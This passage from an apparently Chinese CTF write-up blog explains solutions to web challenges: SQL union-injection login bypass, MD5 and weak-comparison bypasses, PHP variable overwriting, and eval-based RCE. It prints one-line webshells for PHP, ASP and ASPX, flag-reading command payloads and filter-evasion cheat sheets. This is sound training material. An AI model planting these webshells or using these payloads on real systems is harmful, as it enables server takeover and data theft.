src="/2021/01/16/BUUctf-wp/110.jpg"></p><p>闭合方式没有错，更加确定是过滤了or。</p><p>阅读了其他师傅的wp后涨了姿势：</p><p>mysql在查询不存在的数据时，会自动构建虚拟数据</p><p>如：当我们输入username=1&amp;password=1时，此时数据库没有匹配到，就会临时创建这两条数据。</p><p>使用union联合注入这题时，会把2,3注入位的数据分别当做新的username和password。而这题的password是以MD5的方式存储在数据库中，所以师傅的payload为<code>1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code></p><p>3号位为一个MD5值，所以就构造了一个username=admin；password=202cb962ac59075b964b07152d234b70的用户，于是就成功登录得到了flag</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46246804/article/details/109128549?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161452299816780264087906%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161452299816780264087906&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-109128549.first_rank_v2_pc_rank_v29&utm_term=%5BGXYCTF2019%5DBabySQli">参考</a></p><hr><h2 id="二十一、-MRCTF2020-Ez-bypass"><a href="#二十一、-MRCTF2020-Ez-bypass" class="headerlink" title="二十一、[MRCTF2020]Ez_bypass"></a>二十一、[MRCTF2020]Ez_bypass</h2><p>进入页面查看源代码。</p><p><img src="/2021/01/16/BUUctf-wp/111.jpg"></p><p>flag应该在flag.php中，首先第一关是3个等号的MD5绕过，这里得要用数组绕过payload=<code>id[]=1&amp;gg[]=2</code> <a target="_blank" rel="noopener" href="https://blog.csdn.net/iczfy585/article/details/106081299?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161467767316780261915171%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161467767316780261915171&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-5-106081299.first_rank_v2_pc_rank_v29&utm_term=MD5%E7%BB%95%E8%BF%87">md5绕过</a></p><p>第二关要求passwd不为数字，且与1234567进行弱比较，这里passwd传参可以是1234567a，当php进行弱比较时会将字符串解析成数字。</p><p><img src="/2021/01/16/BUUctf-wp/112.jpg"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en"><link itemprop="mainEntityOfPage" href="http://example.com/2020/11/24/web-writeup/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.gif"><meta itemprop="name" content="John Doe"><meta itemprop="description" content=""></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2020/11/24/web-writeup/" class="post-title-link" itemprop="url">web-writeup-1</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">Posted on</span> <time title="Created: 2020-11-24 15:54:45" itemprop="dateCreated datePublished" datetime="2020-11-24T15:54:45+08:00">2020-11-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">Edited on</span> <time title="Modified: 2021-03-02 14:34:07" itemprop="dateModified" datetime="2021-03-02T14:34:07+08:00">2021-03-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/weblearning/" itemprop="url" rel="index"><span itemprop="name">weblearning</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="web-writeup-1"><a href="#web-writeup-1" class="headerlink" title="web-writeup-1"></a><strong>web-writeup</strong>-1</h1><img src="/2020/11/24/web-writeup/3.jpeg" alt="iceland" style="zoom:50%"><h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a><strong>basic rce</strong></h2><p><a target="_blank" rel="noopener" href="http://www.henuctf.com:2077/yijuhua/">http://www.henuctf.com:2077/yijuhua/</a></p><h3 id="一-审题"><a href="#一-审题" class="headerlink" title="一.审题"></a>一.审题</h3><p>该题是考察一句话木马。查找资料后发现这题有点像【bugkuctf】过狗一句话，hack在目标服务器已经放置好了一句话木马，题中有个<code>eval($_GET[&#39;a&#39;])函数</code>，这标志着我们只需要利用好这个木马，读取flag文件。</p><h3 id="二-学习笔记"><a href="#二-学习笔记" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-什么是一句话木马"><a href="#1-什么是一句话木马" class="headerlink" title="1.什么是一句话木马"></a>1.什么是一句话木马</h4><ol><li>文件上传是大部分web应用都具备的功能，如用户上传文件，头像等。</li><li>正常上传的文件一般是图片文档视频等，web应用收集后放在后台，等待用户调用返回</li><li>如果恶意文件如PHP、ASP等执行文件绕过web应用并顺利执行，则相当于hacker直接拿到webshell</li><li>一旦hacker拿到了webshell，则可以拿到web应用的数据，删除web文件，本地提取，进一步拿下整个服务器甚至内网</li><li>SQL注入的对象是数据库服务，而文件上传漏洞主要攻击web服务，两种渗透相结合以达到对目标深度控制</li><li>常用的工具为中国菜刀和中国蚁剑</li></ol><h4 id="2-入侵条件"><a href="#2-入侵条件" class="headerlink" title="2.入侵条件"></a>2.入侵条件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）木马上传成功，未被杀；</span><br><span class="line">（2）知道木马的路径在哪；</span><br><span class="line">（3）上传的木马能正常运行。</span><br></pre></td></tr></table></figure><h4 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因"></a>3.漏洞成因</h4><p>文件上传漏洞的成因，一方面服务器配置不当会导致任意文件上传；另一方面，Web 应用开放了文件上传功能，并且对上传的文件没有进行足够的限制；再者就是程序开发部署时候，没有考虑到系统特性和验证过滤不严格而导致限制被绕过，上传任意文件。</p><h4 id="4-webshell"><a href="#4-webshell" class="headerlink" title="4.webshell"></a>4.webshell</h4><h5 id="a-定义"><a href="#a-定义" class="headerlink" title="a.定义"></a>a.定义</h5><p>在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于windows 系统给的cmd.exe 或者Linux 下bash 等，虽然这些系统的命令解释器不止一种。</p><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p><h5 id="b-分类"><a href="#b-分类" class="headerlink" title="b.分类"></a>b.分类</h5><ol><li><p><strong>大马</strong> 就是网站木马。有一类WebShell 之所以叫大马，是因为与小马（一句话木马）区分开，并且代码量较大，但是功能丰富。同样，大马又很多脚本格式，其功能基本相同。每个团队都有自己的定制木马。</p><p>在大马中，我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。</p></li><li><p><strong>小马</strong> 小马就是一句话木马，因为其代码量比较小，就是一句简单的代码，<u><em>短小精悍</em></u>。常见的小马：</p><ul><li><p>php的一句话木马： <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p></li><li><p>asp的一句话是： <code>&lt;%eval request (&quot;pass&quot;)%&gt;</code></p></li><li><p>aspx的一句话是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure></li></ul><p>而本题涉及的是php小马，所以搜寻了一些php小马方式：</p><p>1.<strong>system()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;    &#x2F;&#x2F;调用system来执行命令</span><br></pre></td></tr></table></figure><p>2.<strong>exec()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">echo exec($cmd);</span><br><span class="line">?&gt;   &#x2F;&#x2F;调用exec执行命令</span><br></pre></td></tr></table></figure><p>3.<strong>passthru()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line"> passthru($cmd);</span><br><span class="line"> ?&gt;      &#x2F;&#x2F;调用passthru执行命令</span><br></pre></td></tr></table></figure><p>4.<strong>echo <code>$cmd</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; $_GET[‘cmd’] ;</span><br><span class="line">echo &#96;$cmd&#96;;</span><br><span class="line">?&gt;  &#x2F;&#x2F;调用echo执行命令</span><br></pre></td></tr></table></figure><p>5.<strong>eval()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; &#x3D;_GET[‘cmd’] ;</span><br><span class="line">eval($cmd)</span><br><span class="line">?&gt;   &#x2F;&#x2F;通过eval执行命令</span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="本题分析"><a href="#本题分析" class="headerlink" title="本题分析"></a><strong>本题分析</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//拿到flag就不要乱玩了哦~ </span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿本题来看，这是属于第5种类型。<code>$_GET[&#39;a&#39;]</code>是指目标服务器中小马的密码为<code>a</code> ；<code>show_source(__FILE__);</code>指当使用该函数时，整个文件都将被显示；<code>eval()</code>则是把字符串作为PHP代码执行,例如：<code>eval(&quot;echo &#39;a&#39;&quot;)</code>;其实就等于直接 <code>echo &#39;a&#39;</code>;再来看看<code>&lt;?php eval($_GET[&#39;a&#39;]); ?&gt;</code>首先，用get方式接收变量a，比如接收到了：a=echo ‘a’;这时代码就变成<code>&lt;?php eval(&quot;echo &#39;a&#39;;&quot;); ?&gt;</code>。也就是说，你想执行什么代码，就把什么代码放进变量a里，用GET传输给一句话木马，你想查看目标硬盘里的文件，可以用php函数：<code>opendir()</code>和<code>readdir()</code>等等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;print_r(readfile(&#39;路径&#39;));读取文件</span><br><span class="line">?a&#x3D;print_r(fopen(&#39;路径&#39;));读取文件</span><br><span class="line">?a&#x3D;print_r(glob(&#39;*.php&#39;));读取文件</span><br><span class="line">?a&#x3D;print_r(scandir(current(localeconv())));扫描目录</span><br><span class="line">?a&#x3D;print_r(scandir(pos(localeconv())));扫描目录</span><br></pre></td></tr></table></figure><p>这题我用<code>?a=print_r(glob(&#39;*.php&#39;));</code>抓取了文件所有文件名包含php的文件（.txt没有读取到），读取到了一个像flag的php文件<img src="/2020/11/24/web-writeup/1.png"></p><p>尝试直接访问文件，无法成功，这里使用system函数读取php文件但是要base64转码，payload：<code>?a=system(&quot;cat f111a9.php | base64&quot;);</code> 或者直接 <strong>php无参数函数构造</strong>， 也就是需要无参数完成 RCE ,<code>a=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code> *pos(localeconv())等于.*在元素查看器可看到flag<img src="/2020/11/24/web-writeup/2.png"></p><p>亦或者<code>a=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code>也有类似的作用不过这是直接在页面中显示<img src="/2020/11/24/web-writeup/3.png"></p><p>还可以用system函数Is一下，看看目录：<code>system(&quot;ls&quot;);</code></p><p>然后继续用system函数查看flag文件，<code>system(&quot;cat 文件名&quot;)</code></p><hr><h2 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h2><p><a target="_blank" rel="noopener" href="http://a16ne.cn:1002/">http://a16ne.cn:1002/</a></p><h3 id="一-审题，做题分析"><a href="#一-审题，做题分析" class="headerlink" title="一.审题，做题分析"></a>一.审题，做题分析</h3><p>由题目可知这是php的变量覆盖，百度后知道变量覆盖漏洞指的是可以用我们的传参值替换原有的变量值。百度后可以大致分析出代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxxxxxxx&#x27;</span>; <span class="comment">//给变量flag赋一个值</span></span><br><span class="line">extract(<span class="variable">$_GET</span>); <span class="comment">//extract函数（变量覆盖的标志），并用get传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$liwu</span>)) &#123;  <span class="comment">//判断是否声明了变量 liwu      </span></span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));   <span class="comment">//file_get_contents函数指打开输出这个文件的内容，而打开的文件名即为赋给flag的值；   trim函数是移除字符串两侧的空白字符或其他预定义字符。功能除去字符串开头和末尾的空格或其他字符。如：&quot; abc &quot;会变成&quot;abc&quot;(无关紧要)； $content=，也是赋值 </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$liwu</span>==<span class="variable">$content</span>) &#123; <span class="comment">//判断两个变量是否绝对相等</span></span><br><span class="line">        <span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxxxxxxxxxx&#125;&#x27;</span>; <span class="comment">//相等则输出flag</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&#x27;please try other operation.&#x27;</span>; <span class="comment">//错误则输出。。。</span></span><br><span class="line">         &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以解这题的关键就是使两个变量相等，而flag是已经确定的变量但是我们不知道，不过extract函数的作用就是可以把flag的值给覆盖掉。其中最普遍的方法就是给<code>flag</code>赋一个空值，而文件显示也会变空值，最后<code>content</code>变量也就为空，接着给<code>liwu</code>也赋个空值就相等了。payload：<code>?flag=&amp;liwu=</code> ; 想了下也可直接，?<code>content=&amp;liwu=</code> ；还可以给flag随便赋一个值，只要是目标服务器中没有的文件名就可，如 <code>?flag=123&amp;liwu=</code></p><h3 id="二-学习笔记-1"><a href="#二-学习笔记-1" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-extract-变量覆盖"><a href="#1-extract-变量覆盖" class="headerlink" title="1.extract()变量覆盖"></a>1.extract()变量覆盖</h4><p>extract()函数能将变量从数组导入当前的符号表，定义：extract(array,extract_rules,prefix)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array 必需。规定要使用的数组</span><br><span class="line">extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定</span><br><span class="line">前缀和数组键名之间会自动加上一个下划线</span><br></pre></td></tr></table></figure><p>该函数的作用：使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。做了一道题，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123; <span class="meta">?&gt;</span> <span class="comment">//判断传参方式为post</span></span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">            extract(<span class="variable">$_POST</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123; <span class="meta">?&gt;</span> <span class="comment">//判断输入的pass和已有的thepassword（未知）两个变量是否相等</span></span><br><span class="line">              &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$theflag</span>; <span class="meta">?&gt;</span>       <span class="comment">//相等就输出flag   &lt;/code&gt;</span></span><br><span class="line">              &lt;/div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">          <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>虽然我们不知道<code>thepassword_123</code>的值，但是extract函数可以覆盖它，所以payload：pass=a&amp;password_123=a</p><h4 id="2-其他"><a href="#2-其他" class="headerlink" title="2.其他"></a>2.其他</h4><p>类似的还有<strong>parse_str()变量覆盖</strong> <strong>import_request_variables()变量覆盖</strong> <strong>$$使用不当</strong></p><p>*<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35569814/article/details/100588340">参考资料</a>*（很全，就不复制张贴了）</p><h2><a href="#" class="headerlink"></a></h2><hr><h2 id="basic-rce2"><a href="#basic-rce2" class="headerlink" title="basic rce2"></a>basic rce2</h2><h3 id="一-审题-1"><a href="#一-审题-1" class="headerlink" title="一.审题"></a>一.审题</h3><p>这题考察web的<strong>命令执行</strong>要绕过正则表达式的过滤作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//flag in flag //提示flag在flag文件中</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Rem&#x27;</span>]))&#123; <span class="comment">//判断是否get传参Rem参数</span></span><br><span class="line">  <span class="variable">$Ram</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Rem&#x27;</span>]; <span class="comment">//定义Ram参数的值即为传的参数</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(more|less|flag|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i&quot;</span>, <span class="variable">$Ram</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;strong&gt;&lt;center&gt;总之就是非常可爱&lt;/center&gt;&lt;/strong&gt;&quot;</span>); <span class="comment">//正则表达式绕过，只要传的参数中有过滤的字符就输出</span></span><br><span class="line">  &#125; </span><br><span class="line">  <span class="variable">$a</span> = <span class="keyword">eval</span>(<span class="variable">$Ram</span>); <span class="comment">//又是eval函数，可将$Ram的值变成指令，所以想办法get一个查看flag的指令，但是又要绕过正则表达式的过滤</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;爬爬爬我最会爬了&#x27;)//</span></span><br><span class="line"><span class="string">  &lt;/script&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这题还可以用无参数函数构造，*<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">也就是需要无参数完成 RCE</a>*，payload：</p><p><code>Rem=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code>不用过滤直接出，好家伙。</p><p><img src="/2020/11/24/web-writeup/4.jpg"></p><p>首先可以用system函数Is一下查看目录，再接着绕过正则表达式，具体的方法有很多，比如base64,进制转换，反斜杆，等</p><p><em><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40671478/article/details/107569287?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160681018819724813266872%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160681018819724813266872&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-107569287.first_rank_v2_pc_rank_v29&utm_term=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87&spm=1018.2118.3001.4449">参考资料</a></strong></em></p><h3 id="2-学习笔记"><a href="#2-学习笔记" class="headerlink" title="2.学习笔记"></a>2.学习笔记</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><ul><li>正则表达式是一种可以用于模式匹配和替换的强大工具。</li><li>一个正则表达式，分为三个部分：分隔符，表达式和修饰符。</li><li>分隔符可以是除了特殊字符以外的任何字符（比如”/ !”等等），常用的分隔符是”/”。</li><li>表达式由一些特殊字符（特殊字符详见下面）和非特殊的字符串组成，比如”[a-z0-9_-]+@[a-z0-9_-.]+”可以匹配一个简单的电子邮件字符串。</li><li>修饰符是用来开启或者关闭某种功能/模式。</li><li>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</li></ul><p>如：/hello.+?hello/is</p><p>上面的正则表达式”/”就是分隔符，两个”/”之间的就是表达式，第二个”/”后面的字符串”is”就是修饰符。<br>  在表达式中如果含有分隔符，那么就需要使用转义符号”/”，比如”/hello.+?//hello/is”。转义符号除了用于分隔符外还可以执行特殊字符，全部由字母构成的特殊字符都需要”/”来转义，比如”/d”代表全体数字。***<a target="_blank" rel="noopener" href="https://blog.csdn.net/William0318/article/details/54345526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160656869119724827695135%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160656869119724827695135&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-54345526.first_rank_v2_pc_rank_v29&utm_term=php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2118.3001.4449">资料参考</a>***</p><h4 id="主要的过滤内容"><a href="#主要的过滤内容" class="headerlink" title="主要的过滤内容"></a>主要的过滤内容</h4><p>1.<strong>假如cat被过滤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容 </span><br><span class="line">less:与 more 类似 </span><br><span class="line">head:查看头几行 </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号 </span><br><span class="line">od:以二进制的方式读取档案内容 </span><br><span class="line">vi:一种编辑器，这个也可以查看 </span><br><span class="line">vim:一种编辑器，这个也可以查看 </span><br><span class="line">sort:可以查看 </span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure><p>2.<strong>过滤命令执行函数</strong>，其中system和passthru是有回显的，其他的就得需要我们自行输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure><p>3.<strong>空格绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符 </span><br><span class="line">%09(需要php环境) </span><br><span class="line">$&#123;IFS&#125; </span><br><span class="line">$IFS$9 </span><br><span class="line">&#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能 %20 %09</span><br></pre></td></tr></table></figure><p>4.<strong>过滤了分号可以用?&gt;绕过</strong></p><p>绕过过滤的方法还有很多，慢慢学，就不复制粘贴了，***<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107676580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160655551419721940213768%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160655551419721940213768&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107676580.first_rank_v2_pc_rank_v29&utm_term=ctfrce">参考资料</a>***</p><hr><img src="/2020/11/24/web-writeup/5.jpeg" style="zoom:50%"><hr><h2 id="php变量覆盖2"><a href="#php变量覆盖2" class="headerlink" title="php变量覆盖2"></a>php变量覆盖2</h2><h3 id="一-审题-2"><a href="#一-审题-2" class="headerlink" title="一.审题"></a>一.审题</h3><p>该题也是变量覆盖，与之前不同的是这是<code>$$</code>使用不当造成的，首先分析代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  <span class="comment">//包含文件</span></span><br><span class="line"><span class="variable">$_403</span> = <span class="string">&quot;拒绝访问&quot;</span>;  <span class="comment">//定义参数</span></span><br><span class="line"><span class="variable">$_200</span> = <span class="string">&quot;欢迎~~~&quot;</span>;<span class="comment">//定义参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)<span class="comment">//判断传参方式是否为post</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;sssssssspost…&quot;</span>);<span class="comment">//不是post便输出</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]) )<span class="comment">//判断是否post了flag的参数</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$_403</span>);<span class="comment">//不是就输出</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)<span class="comment">//foreach函数来遍历数组中的值，用get方法传输的数据当做数组进行遍历，并将遍历的参数赋值给key，将参数值复制给value。</span></span><br><span class="line">  <span class="variable">$$key</span> = <span class="variable">$$value</span>;<span class="comment">//这里将键和值又当做变量来使用。我们用get方法传递：_200=flag,经过$$key = $$value的处理后，就会变为$_200=$flag，这样就会将原来的$_200的值覆盖掉，换成$flag的值</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)<span class="comment">//同10，方式变为post</span></span><br><span class="line">  <span class="variable">$$key</span> = <span class="variable">$value</span>;<span 